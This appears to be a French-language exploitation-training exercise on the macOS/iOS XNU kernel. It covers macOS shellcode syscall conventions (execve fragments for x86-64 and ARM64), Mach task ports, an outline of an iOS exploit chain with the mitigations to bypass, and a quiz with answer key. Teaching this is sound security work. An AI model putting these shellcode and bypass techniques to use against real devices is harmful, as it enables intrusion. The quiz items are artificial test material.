#### Piege 1 : Syscall numbers macOS vs Linux

```python
# MAUVAIS (Linux style)
shellcode = "mov rax, 59; syscall"

# BON (macOS style)
shellcode = "mov rax, 0x200003B; syscall"  # 0x2000000 + 59
```

#### Piege 2 : ARM64 syscall convention

```python
# MAUVAIS (Linux ARM64)
shellcode = "mov x8, #221; svc #0"

# BON (macOS ARM64)
shellcode = "mov x16, #59; svc #0x80"
#           ^             ^
#           x16!          0x80!
```

### 5.5 Cours Complet

#### 5.5.1 Mach Ports en detail

Les Mach ports sont la base de tout IPC sur macOS/iOS :

```
Port = Kernel-protected message queue
       + Set of rights (send, receive, etc.)
       + Reference count

Task Port = Represents a process
            - vm_read/vm_write: Read/write process memory
            - thread_create: Create new threads
            - task_info: Get process information

Host Port = Represents the system
            - host_info: System information
            - host_statistics: CPU/memory stats
            - host_priv: Privileged operations (dangerous!)
```

#### 5.5.2 Exploitation iOS moderne

```
Typical iOS exploit chain:
1. Initial access (Safari, iMessage, etc.)
2. Sandbox escape (IPC bug, kernel vuln)
3. PAC bypass (signing gadget, oracle)
4. Kernel r/w primitive (task port, physmap)
5. Post-exploitation (persistence, data access)

Mitigations to bypass:
- ASLR: Information leak needed
- PAC: Signing gadget or oracle
- PPL: Kernel memory corruption
- APRR: Page table manipulation
```

### 5.8 Mnemotechniques

#### MEME : "Mach Ports = Badges d'acces"

```
Imagine un immeuble de bureaux:

SEND RIGHT = Badge visiteur
  - Peut entrer et parler a la reception
  - Acces limite

RECEIVE RIGHT = Badge employe
  - Peut recevoir des messages
  - Un seul employe par bureau

HOST_PRIV = Badge admin building
  - Acces a tout l'immeuble
  - Peut changer les serrures
  - TRES DANGEREUX si vole!

TASK_FOR_PID(0) = Badge du PDG
  - Controle total
  - Equivalent a kernel access
```

---

## SECTION 6 : PIEGES - RECAPITULATIF

| # | Piege | Consequence | Solution |
|---|-------|-------------|----------|
| 1 | Syscall number Linux vs macOS | Shellcode ne fonctionne pas | Utiliser 0x2000000 + BSD # |
| 2 | ARM64 x8 vs x16 | Mauvais syscall | macOS utilise x16 |
| 3 | SVC #0 vs #0x80 | Mauvaise trap | macOS utilise SVC #0x80 |
| 4 | Gatekeeper et notarization | False negative | Verifier signed ET notarized |
| 5 | task_self sous-estime | Risk mal evalue | task_self = medium risk |

---

## SECTION 7 : QCM

### Question 1
**Quel registre contient le syscall number sur macOS ARM64 ?**

A) x0
B) x8
C) x16
D) x17
E) x30

**Reponse : C**

---

### Question 2
**Quelle est la formule pour les BSD syscalls sur macOS x86-64 ?**

A) syscall number directly
B) 0x1000000 + number
C) 0x2000000 + number
D) 0x80000000 + number

**Reponse : C**

---

### Question 3
**Quel Mach port donne un acces equivalent a kernel r/w ?**

A) task_self
B) host
C) thread_self
D) task_for_pid(0)

**Reponse : D**

---

## SECTION 8 : RECAPITULATIF

| Element | Valeur |
|---------|--------|
| **Difficulte** | 9/10 |
| **Temps estime** | 120 min |
| **XP Base** | 350 |
| **XP Bonus** | x4 (1400 total) |
| **Concepts cles** | XNU, Mach ports, macOS shellcode, Gatekeeper |
| **Langage** | Python 3.12 |

---

## SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.4.3-b-xnu-deep-dive",
    "generated_at": "2026-01-16 15:30:00",

    "metadata": {
      "exercise_id": "3.4.3-b",
      "exercise_name": "xnu_deep_dive",
      "module": "3.4.3",
      "module_name": "macOS/iOS Specifics",
      "concept": "b",
      "concept_name": "Kernel XNU et exploitation macOS avancee",
      "type": "code",
      "tier": 3,
      "difficulty": 9,
      "language": "python",
      "duration_minutes": 120,
      "xp_base": 350,
      "xp_bonus_multiplier": 4,
      "tags": ["xnu", "kernel", "macos", "ios", "shellcode", "mach-ports"]
    }
  }
}
```
